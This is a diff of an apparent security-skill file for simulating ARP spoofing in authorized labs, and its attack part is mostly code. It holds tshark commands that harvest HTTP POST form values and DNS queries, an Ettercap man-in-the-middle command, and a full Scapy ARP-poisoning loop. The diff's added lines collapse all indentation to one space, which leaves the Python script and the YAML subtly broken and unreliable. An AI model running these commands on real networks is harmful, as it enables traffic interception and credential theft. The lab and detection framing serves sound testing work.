@@ -1,13 +1,13 @@
 ---
 name: performing-arp-spoofing-attack-simulation
 description: 'Simulates ARP spoofing/cache-poisoning attacks in authorized lab or
-  pentest environments using arpspoof, Ettercap, and Scapy to demonstrate man-in-the-middle
-  risk and validate Dynamic ARP Inspection, port security, and network monitoring
-  detections. Use when testing whether switches, IDS/IPS, or a SIEM detect ARP spoofing
-  under written authorization; do not use on production networks without explicit
-  approval.
+ pentest environments using arpspoof, Ettercap, and Scapy to demonstrate man-in-the-middle
+ risk and validate Dynamic ARP Inspection, port security, and network monitoring
+ detections. Use when testing whether switches, IDS/IPS, or a SIEM detect ARP spoofing
+ under written authorization; do not use on production networks without explicit
+ approval.
 
-  '
+ '
 domain: cybersecurity
 subdomain: network-security
 tags:
@@ -112,15 +112,15 @@ sudo tcpdump -i eth0 -w mitm_capture.pcap host 192.168.1.50
 
 # Use tshark to capture HTTP credentials in real-time
 sudo tshark -i eth0 -Y "http.request.method == POST" \
-  -T fields -e ip.src -e http.host -e http.request.uri -e urlencoded-form.value
+ -T fields -e ip.src -e http.host -e http.request.uri -e urlencoded-form.value
 
 # Capture DNS queries from the victim
 sudo tshark -i eth0 -Y "dns.qry.name and ip.src == 192.168.1.50" \
-  -T fields -e frame.time -e dns.qry.name
+ -T fields -e frame.time -e dns.qry.name
 
 # Use Ettercap with password collection filters
 sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1// \
-  -w ettercap_capture.pcap
+ -w ettercap_capture.pcap
 ```
 
 ### Step 5: Demonstrate Impact with Scapy (Custom ARP Packets)
@@ -136,53 +136,53 @@ import sys
 conf.verb = 0
 
 def get_mac(ip, iface="eth0"):
-    """Resolve IP to MAC address via ARP request."""
-    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
-                 timeout=2, iface=iface)
-    if ans:
-        return ans[0][1].hwsrc
-    return None
+ """Resolve IP to MAC address via ARP request."""
+ ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
+ timeout=2, iface=iface)
+ if ans:
+ return ans[0][1].hwsrc
+ return None
 
 def spoof(target_ip, spoof_ip, target_mac, iface="eth0"):
-    """Send spoofed ARP reply to target."""
-    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    sendp(Ether(dst=target_mac) / packet, iface=iface, verbose=False)
+ """Send spoofed ARP reply to target."""
+ packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+ sendp(Ether(dst=target_mac) / packet, iface=iface, verbose=False)
 
 def restore(target_ip, gateway_ip, target_mac, gateway_mac, iface="eth0"):
-    """Restore legitimate ARP entries."""
-    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
-                 psrc=gateway_ip, hwsrc=gateway_mac)
-    sendp(Ether(dst=target_mac) / packet, iface=iface, count=5, verbose=False)
+ """Restore legitimate ARP entries."""
+ packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
+ psrc=gateway_ip, hwsrc=gateway_mac)
+ sendp(Ether(dst=target_mac) / packet, iface=iface, count=5, verbose=False)
 
 if __name__ == "__main__":
-    target_ip = "192.168.1.50"
-    gateway_ip = "192.168.1.1"
-    iface = "eth0"
+ target_ip = "192.168.1.50"
+ gateway_ip = "192.168.1.1"
+ iface = "eth0"
 
-    target_mac = get_mac(target_ip, iface)
-    gateway_mac = get_mac(gateway_ip, iface)
+ target_mac = get_mac(target_ip, iface)
+ gateway_mac = get_mac(gateway_ip, iface)
 
-    if not target_mac or not gateway_mac:
-        print("[!] Could not resolve MAC addresses. Exiting.")
-        sys.exit(1)
+ if not target_mac or not gateway_mac:
+ print("[!] Could not resolve MAC addresses. Exiting.")
+ sys.exit(1)
 
-    print(f"[*] Target: {target_ip} ({target_mac})")
-    print(f"[*] Gateway: {gateway_ip} ({gateway_mac})")
-    print("[*] Starting ARP spoofing... Press Ctrl+C to stop.")
+ print(f"[*] Target: {target_ip} ({target_mac})")
+ print(f"[*] Gateway: {gateway_ip} ({gateway_mac})")
+ print("[*] Starting ARP spoofing... Press Ctrl+C to stop.")
 
-    try:
-        packets_sent = 0
-        while True:
-            spoof(target_ip, gateway_ip, target_mac, iface)
-            spoof(gateway_ip, target_ip, gateway_mac, iface)
-            packets_sent += 2
-            print(f"\r[*] Packets sent: {packets_sent}", end="")
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print("\n[*] Restoring ARP tables...")
-        restore(target_ip, gateway_ip, target_mac, gateway_mac, iface)
-        restore(gateway_ip, target_ip, gateway_mac, target_mac, iface)
-        print("[*] ARP tables restored. Exiting.")
+ try:
+ packets_sent = 0
+ while True:
+ spoof(target_ip, gateway_ip, target_mac, iface)
+ spoof(gateway_ip, target_ip, gateway_mac, iface)
+ packets_sent += 2
+ print(f"\r[*] Packets sent: {packets_sent}", end="")
+ time.sleep(1)
+ except KeyboardInterrupt:
+ print("\n[*] Restoring ARP tables...")
+ restore(target_ip, gateway_ip, target_mac, gateway_mac, iface)
+ restore(gateway_ip, target_ip, gateway_mac, target_mac, iface)
+ print("[*] ARP tables restored. Exiting.")
 ```
 
 ### Step 6: Verify Detection and Cleanup
@@ -195,7 +195,7 @@ arp -a | grep 192.168.1.1
 # Check IDS/SIEM for ARP spoofing alerts
 # Snort rule that should trigger:
 # alert arp any any -> any any (msg:"ARP Spoof Detected"; arp.opcode:2;
-#   threshold:type both, track by_src, count 30, seconds 10; sid:1000010;)
+# threshold:type both, track by_src, count 30, seconds 10; sid:1000010;)
 
 # Stop the attack and restore ARP tables
 # Ctrl+C on arpspoof/ettercap sessions
